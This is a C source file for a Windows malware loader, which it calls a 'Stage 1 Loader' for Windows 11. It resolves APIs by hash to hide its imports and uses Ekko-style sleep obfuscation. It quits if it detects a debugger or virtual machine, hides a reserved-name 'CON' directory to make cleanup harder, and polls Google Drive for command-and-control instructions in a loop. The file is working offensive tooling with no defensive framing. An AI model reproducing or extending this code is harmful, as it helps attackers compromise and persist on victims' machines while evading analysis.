/*
 * Advanced Windows 11 Entry Vector - Stage 1 Loader
 * Integrates API Hashing, Sleep Obfuscation, and Anti-Analysis techniques.
 */

#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include "crypto.h"
#include "api_hashes.h"
#include "gdrive_c2.h"

// Struct for dynamic API table
typedef struct _API_TABLE {
    ULONG_PTR NtQuerySystemInformation;
    ULONG_PTR NtAllocateVirtualMemory;
    ULONG_PTR NtProtectVirtualMemory;
    ULONG_PTR NtCreateThreadEx;
    ULONG_PTR NtClose;
    ULONG_PTR RtlCaptureContext;
    ULONG_PTR RtlRestoreContext;
    ULONG_PTR CreateWaitableTimerW;
    ULONG_PTR SetWaitableTimer;
} API_TABLE;

static API_TABLE g_ApiTable = {0};

// --- API Resolution Helpers ---

static PIMAGE_NT_HEADERS GetNtHeaders(HMODULE hModule) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    return (PIMAGE_NT_HEADERS)((BYTE *)hModule + dosHeader->e_lfanew);
}

static PVOID GetModuleBaseByHash(uint32_t hash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (HashStringDjb2W(entry->BaseDllName.Buffer) == hash) {
            return entry->DllBase;
        }
        current = current->Flink;
    }
    return NULL;
}

static PVOID ResolveApiByHash(HMODULE hModule, uint32_t apiHash) {
    PIMAGE_NT_HEADERS ntHeaders = GetNtHeaders(hModule);
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD *)((BYTE *)hModule + exportDir->AddressOfNames);
    DWORD *functions = (DWORD *)((BYTE *)hModule + exportDir->AddressOfFunctions);
    WORD *ordinals = (WORD *)((BYTE *)hModule + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char *funcName = (char *)((BYTE *)hModule + names[i]);
        if (HashStringDjb2A(funcName) == apiHash) {
            return (PVOID)((BYTE *)hModule + functions[ordinals[i]]);
        }
    }
    return NULL;
}

static void InitializeApiTable() {
    HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(HashStringDjb2W(L"ntdll.dll"));
    HMODULE hKernel32 = (HMODULE)GetModuleBaseByHash(HashStringDjb2W(L"kernel32.dll"));

    g_ApiTable.NtQuerySystemInformation = (ULONG_PTR)ResolveApiByHash(hNtdll, HASH_NtQuerySystemInformation);
    g_ApiTable.NtAllocateVirtualMemory = (ULONG_PTR)ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
    g_ApiTable.NtProtectVirtualMemory = (ULONG_PTR)ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    g_ApiTable.NtCreateThreadEx = (ULONG_PTR)ResolveApiByHash(hNtdll, HASH_NtCreateThreadEx);
    g_ApiTable.NtClose = (ULONG_PTR)ResolveApiByHash(hNtdll, HASH_NtClose);
    g_ApiTable.RtlCaptureContext = (ULONG_PTR)ResolveApiByHash(hNtdll, HASH_RtlCaptureContext);
    g_ApiTable.RtlRestoreContext = (ULONG_PTR)ResolveApiByHash(hNtdll, HASH_RtlRestoreContext);
    
    g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
    g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
}

// --- Sleep Obfuscation (Ekko Style Lite) ---

static void StealthSleep(DWORD dwMilliseconds) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    HANDLE hTimer = ((HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR))g_ApiTable.CreateWaitableTimerW)(NULL, FALSE, NULL);
    if (!hTimer) return;

    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = -(LONGLONG)dwMilliseconds * 10000LL;

    ((BOOL(WINAPI *)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL))g_ApiTable.SetWaitableTimer)(hTimer, &liDueTime, 0, NULL, NULL, FALSE);

    // Capture context and wait
    ((VOID(WINAPI *)(PCONTEXT))g_ApiTable.RtlCaptureContext)(&ctx);
    
    // In a full Ekko implementation, we would queue APCs to encrypt memory here
    WaitForSingleObject(hTimer, INFINITE);

    CloseHandle(hTimer);
}

// --- Anti-Analysis ---

static BOOL IsEnvironmentSafe() {
    // 1. BeingDebugged flag in PEB
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) return FALSE;

    // 2. Simple VM check (CPU cores)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return FALSE;

    return TRUE;
}

// --- Persistence (Immortal Directory) ---

static void EstablishPersistence() {
    // Creating a directory with a reserved name "CON" to hinder manual cleanup
    // Note: This requires the \\.\ prefix
    CreateDirectoryW(L"\\\\.\\C:\\Windows\\Tasks\\CON", NULL);
    SetFileAttributesW(L"\\\\.\\C:\\Windows\\Tasks\\CON", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

// --- Main Execution ---

int main() {
    // 1. Initialize stealth components
    InitializeApiTable();

    // 2. Environmental check
    if (!IsEnvironmentSafe()) {
        return 0; // Terminate silently
    }

    // 3. Persistent foothold
    EstablishPersistence();

    // 4. Initialize C2
    InitGDriveApi();

    // 5. Main loop with stealth sleep
    char cmdBuffer[1024];
    while (TRUE) {
        // Check for commands via Google Drive
        if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) {
            // Process commands (placeholder)
            // ... decrypt and execute ...
        }

        StealthSleep(60000); // Sleep for 1 minute between cycles
    }

    return 0;
}
